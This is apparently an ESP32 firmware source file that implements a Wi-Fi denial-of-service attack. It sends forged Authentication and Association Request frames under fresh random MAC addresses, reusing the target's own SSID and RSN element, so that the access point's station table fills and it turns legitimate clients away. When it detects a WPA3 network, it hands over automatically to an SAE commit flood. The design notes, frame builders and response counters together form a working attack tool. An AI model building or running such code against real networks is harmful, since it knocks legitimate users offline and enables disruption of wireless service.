// Authentication / Association Request flooding with automatic WPA3 upgrade.
//
// Design notes (why it is shaped this way):
//   * Authentication (subtype 11) with algorithm 0 and sequence 1 is the first
//     leg of every association, and the AP keys the new state on the transmitter
//     address. A different forged MAC per exchange therefore costs it a state
//     entry, and an Association Request that follows costs it a station table
//     entry -- which is what eventually makes it refuse *legitimate* stations.
//   * One identity sends one Authentication and then one (Re)Association Request
//     before the next MAC is drawn: that is the sequence a real station produces,
//     and it forces the AP to allocate and release instead of only rejecting.
//   * The Association Request carries the target's own SSID and RSN element (both
//     learned from its beacon): without them the AP rejects the frame before it
//     ever looks at the station table, and the flood would cost nothing.
//   * An SAE (WPA3) AP answers open-system Authentication with status 13 and never
//     allocates anything, so the flood becomes free for the AP. The RSN element is
//     therefore classified first (`sae_classify()`), and when the AKM list has SAE
//     the module stops itself and starts the SAE Commit flood -- `upgraded`
//     reports that hand-over.
//   * The AP's answers are the measurement: status 13 means "this AP does not do
//     open auth", 17 means its station table is full, 0 means it accepted one of
//     our forged identities.

#include "authflood.h"
#include "radio.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "ie_util.h"
#include "sae.h"
#include "tx_guard.h"

namespace {

const uint8_t kSeqHigh = 0xF0;
const uint8_t kSeqLow = 0xFF;
// 50 ms between frames: 20 frames/s is the measured ceiling for unicast management
// injection on this driver (50 frames/s exhausts the pool after ~63 frames, see
// tx_guard.h). Frames go out one at a time, round-robin over the identities.
const uint32_t kGapMs = 50;
const uint16_t kListenInterval = 10;

bool s_active;
uint32_t s_index;
uint8_t s_bssid[6];
uint8_t s_channel;
authflood_mode_t s_mode = AUTHFLOOD_BOTH;
bool s_auto_upgrade = true;
bool s_upgraded;
volatile bool s_upgrade_request;
sae_security_t s_upgrade_security;
uint32_t s_last_tx_ms;
uint32_t s_state;  // 0 = next frame is the auth, 1 = the assoc request

char s_ssid[33];
uint8_t s_ssid_len;
uint8_t s_rsn[64];
uint8_t s_rsn_len;

uint8_t s_ident[6];
uint32_t s_frames;
uint32_t s_auth_frames;
uint32_t s_assoc_frames;
uint32_t s_identities;
uint32_t s_auth_responses;
uint32_t s_assoc_responses;
uint16_t s_last_status;
uint32_t s_rng = 0x7F4A7C15;

uint32_t next_rand(void) {
    s_rng ^= s_rng << 13;
    s_rng ^= s_rng >> 17;
    s_rng ^= s_rng << 5;
    return s_rng;
}

void random_identity(void) {
    for (int i = 0; i < 6; i++) {
        s_ident[i] = (uint8_t)(next_rand() & 0xFF);
    }
    s_ident[0] = (uint8_t)((s_ident[0] & 0xFC) | 0x02);  // locally administered
    s_identities++;
}

// Authentication: algorithm 0 (open), sequence 1 (request), status 0.
size_t build_auth(uint8_t* frame) {
    memset(frame, 0, 32);
    frame[0] = 0xB0;  // management, subtype 11 = authentication
    frame[1] = 0x00;
    memcpy(frame + 4, s_bssid, 6);
    memcpy(frame + 10, s_ident, 6);
    memcpy(frame + 16, s_bssid, 6);
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;
    frame[24] = 0;  // algorithm: open system
    frame[25] = 0;
    frame[26] = 1;  // transaction sequence 1 = request
    frame[27] = 0;
    frame[28] = 0;  // status 0
    frame[29] = 0;
    return 30;
}

// Association Request: capability + listen interval, then SSID, rates and the
// target's own RSN element.
size_t build_assoc(uint8_t* frame) {
    memset(frame, 0, 128);
    frame[0] = 0x00;  // management, subtype 0 = association request
    frame[1] = 0x00;
    memcpy(frame + 4, s_bssid, 6);
    memcpy(frame + 10, s_ident, 6);
    memcpy(frame + 16, s_bssid, 6);
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;

    size_t n = 24;
    frame[n++] = 0x11;  // capability: ESS + privacy (matches a WPA/WPA2 beacon)
    frame[n++] = 0x04;
    frame[n++] = (uint8_t)(kListenInterval & 0xFF);
    frame[n++] = (uint8_t)(kListenInterval >> 8);

    frame[n++] = 0;  // SSID
    frame[n++] = s_ssid_len;
    memcpy(frame + n, s_ssid, s_ssid_len);
    n += s_ssid_len;
    static const uint8_t kRates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
    frame[n++] = 1;
    frame[n++] = sizeof(kRates);
    memcpy(frame + n, kRates, sizeof(kRates));
    n += sizeof(kRates);
    if (s_rsn_len > 0 && n + s_rsn_len < 120) {
        memcpy(frame + n, s_rsn, s_rsn_len);
        n += s_rsn_len;
    }
    return n;
}

}  // namespace

bool authflood_start(int index, authflood_mode_t mode, bool auto_upgrade) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_index = (uint32_t)index;
    s_channel = WiFi.channel(index);
    const String ssid = WiFi.SSID(index);
    s_ssid_len = (uint8_t)(ssid.length() > 32 ? 32 : ssid.length());
    memcpy(s_ssid, ssid.c_str(), s_ssid_len);
    s_ssid[s_ssid_len] = 0;
    s_rsn_len = 0;

    s_mode = mode;
    s_auto_upgrade = auto_upgrade;
    s_upgraded = false;
    s_upgrade_request = false;
    s_active = true;
    s_frames = 0;
    s_auth_frames = 0;
    s_assoc_frames = 0;
    s_identities = 0;
    s_auth_responses = 0;
    s_assoc_responses = 0;
    s_last_status = 0;
    s_state = 0;
    random_identity();
    s_last_tx_ms = millis() - kGapMs;

    radio_set_channel("authflood", s_channel);
    attack_sniffer_enable();
    return true;
}

void authflood_stop(void) {
    s_active = false;
}

void authflood_step(void) {
    if (s_upgrade_request) {
        // Deferred from the receive path: the target turned out to be WPA3, so the
        // open-system auth flood costs it nothing. Hand over to the SAE commits.
        s_upgrade_request = false;
        s_upgraded = true;
        s_active = false;
        Serial.printf("INFO AUTHFLOOD %s -> SAE commit flood\n",
                      sae_security_name(s_upgrade_security));
        sae_start((int)s_index, SAE_ELEM_BASEPOINT, 0);
        return;
    }
    if (!s_active) {
        return;
    }
    const uint32_t now = millis();
    if (now - s_last_tx_ms < kGapMs) {
        return;
    }
    s_last_tx_ms = now;

    uint8_t frame[128];
    size_t len;
    bool send_auth;
    if (s_mode == AUTHFLOOD_AUTH_ONLY) {
        send_auth = true;
    } else if (s_mode == AUTHFLOOD_ASSOC_ONLY) {
        send_auth = false;
    } else {
        send_auth = (s_state == 0);
    }
    len = send_auth ? build_auth(frame) : build_assoc(frame);

    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        if (send_auth) {
            s_auth_frames++;
        } else {
            s_assoc_frames++;
        }
        if (s_mode == AUTHFLOOD_BOTH) {
            s_state ^= 1u;
            if (s_state == 0) {
                random_identity();  // auth + assoc done: next station
            }
        } else {
            random_identity();
        }
    }
}

void authflood_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (len < 24) {
        return;
    }
    if (type != 0) {
        return;
    }
    // Beacon / probe response of the target: keep its SSID and RSN element for the
    // forged Association Request, and classify its AKM list.
    if ((subtype == 8 || subtype == 5) && memcmp(frame + 10, s_bssid, 6) == 0 && len > 38) {
        const uint8_t* ies = frame + 36;
        const uint8_t* end = frame + len;
        uint16_t ie_len = 0;
        const uint8_t* ssid = ie_find(ies, end, 0, &ie_len);
        if (ssid != nullptr && ie_len <= 32) {
            memcpy(s_ssid, ssid, ie_len);
            s_ssid_len = (uint8_t)ie_len;
        }
        if (s_rsn_len == 0) {
            const uint8_t* rsn = ie_find(ies, end, 48, &ie_len);
            if (rsn != nullptr && ie_len + 2 <= sizeof(s_rsn)) {
                s_rsn[0] = 48;
                s_rsn[1] = (uint8_t)ie_len;
                memcpy(s_rsn + 2, rsn, ie_len);
                s_rsn_len = (uint8_t)(ie_len + 2);
            }
        }
        if (s_auto_upgrade && !s_upgraded) {
            const sae_security_t sec = sae_classify(frame, len);
            if (sec == SAE_SEC_SAE || sec == SAE_SEC_TRANSITION) {
                // An SAE AP ignores open-system auth, so the flood would be free
                // for it: hand the target over to the commit flood instead. The
                // switch happens in authflood_step() -- this callback runs inside
                // the promiscuous path, where printing or changing the channel is
                // not allowed.
                s_upgrade_request = true;
                s_upgrade_security = sec;
            }
        }
        return;
    }
    if (!s_active) {
        return;
    }
    // The AP's answers to our forged identities.
    if (memcmp(frame + 10, s_bssid, 6) != 0) {
        return;
    }
    if (subtype == 11 && len >= 30) {
        if (memcmp(frame + 4, s_ident, 6) == 0) {
            s_auth_responses++;
            s_last_status = (uint16_t)(frame[28] | (frame[29] << 8));
        }
        return;
    }
    if ((subtype == 1 || subtype == 3) && len >= 30) {
        if (memcmp(frame + 4, s_ident, 6) == 0) {
            s_assoc_responses++;
            s_last_status = (uint16_t)(frame[26] | (frame[27] << 8));
        }
    }
}

void authflood_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    if (s_ssid_len == 0) {
        memcpy(s_ssid, "AUTHFLOODTEST", 13);
        s_ssid_len = 13;
    }
    if (s_ident[0] == 0) {
        random_identity();
    }

    uint8_t frame[128];
    const size_t auth_len = build_auth(frame);
    Serial.printf("AUTHFLOODTEST auth len=%u alg=%u seq=%u status=%u\n", (unsigned)auth_len,
                  (unsigned)(frame[24] | (frame[25] << 8)),
                  (unsigned)(frame[26] | (frame[27] << 8)),
                  (unsigned)(frame[28] | (frame[29] << 8)));
    Serial.print("AUTHFLOODTEST auth hex=");
    for (size_t i = 0; i < auth_len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t assoc_len = build_assoc(frame);
    Serial.printf("AUTHFLOODTEST assoc len=%u cap=0x%04X listen=%u ssid=%u rsn=%u\n",
                  (unsigned)assoc_len, (unsigned)(frame[24] | (frame[25] << 8)),
                  (unsigned)(frame[26] | (frame[27] << 8)), (unsigned)frame[29],
                  (unsigned)s_rsn_len);
    Serial.print("AUTHFLOODTEST assoc hex=");
    for (size_t i = 0; i < assoc_len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool authflood_active(void) {
    return s_active;
}

const char* authflood_mode_name(void) {
    switch (s_mode) {
        case AUTHFLOOD_AUTH_ONLY:
            return "auth";
        case AUTHFLOOD_ASSOC_ONLY:
            return "assoc";
        default:
            return "both";
    }
}

uint32_t authflood_frames(void) {
    return s_frames;
}

uint32_t authflood_auth_frames(void) {
    return s_auth_frames;
}

uint32_t authflood_assoc_frames(void) {
    return s_assoc_frames;
}

uint32_t authflood_identities(void) {
    return s_identities;
}

uint32_t authflood_auth_responses(void) {
    return s_auth_responses;
}

uint32_t authflood_assoc_responses(void) {
    return s_assoc_responses;
}

uint16_t authflood_last_status(void) {
    return s_last_status;
}

bool authflood_upgraded(void) {
    return s_upgraded;
}
